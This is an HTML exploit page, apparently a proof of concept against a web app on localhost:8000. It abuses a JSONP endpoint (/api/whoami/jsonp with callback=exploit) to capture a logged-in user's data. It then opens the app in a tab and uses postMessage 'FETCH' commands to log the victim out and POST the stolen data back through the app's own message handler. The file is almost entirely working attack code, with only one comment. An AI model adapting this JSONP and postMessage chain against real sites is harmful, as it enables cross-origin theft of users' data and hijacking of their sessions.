<!DOCTYPE html>
<html>
<head>
  <title>Redirect</title>
</head>
<body>
<script>
    function runSequence(tab, secretData) {
        const targetOrigin = 'http://localhost:8000';

        tab.postMessage({ action: 'FETCH', method: 'GET', path: '/#/sheets' }, targetOrigin);

        setTimeout(() => {
            tab.postMessage({ action: 'FETCH', method: 'GET', path: '/api/logout' }, targetOrigin);
        }, 1000);

        setTimeout(() => {
            tab.postMessage({
                action: 'FETCH',
                method: 'POST',
                path: '/api/whoami',
                payload: { data: secretData }
            }, targetOrigin);
        }, 1000);

        setTimeout(() => {
            tab.postMessage({ action: 'FETCH', method: 'GET', path: '/#/settings' }, targetOrigin);
        }, 2000);
    }

    function exploit(data) {
        console.log("JSONP data:", data);

        const svelteTab = window.open('http://localhost:8000', 'evil_tab');

        setTimeout(() => {
            console.log('Run Sequence...');
            runSequence(svelteTab, data);
        }, 3000);
    }
  </script>

  <!-- JSONP запрос -->
  <script src="http://localhost:8000/api/whoami/jsonp?callback=exploit"></script>
</body>
</html>
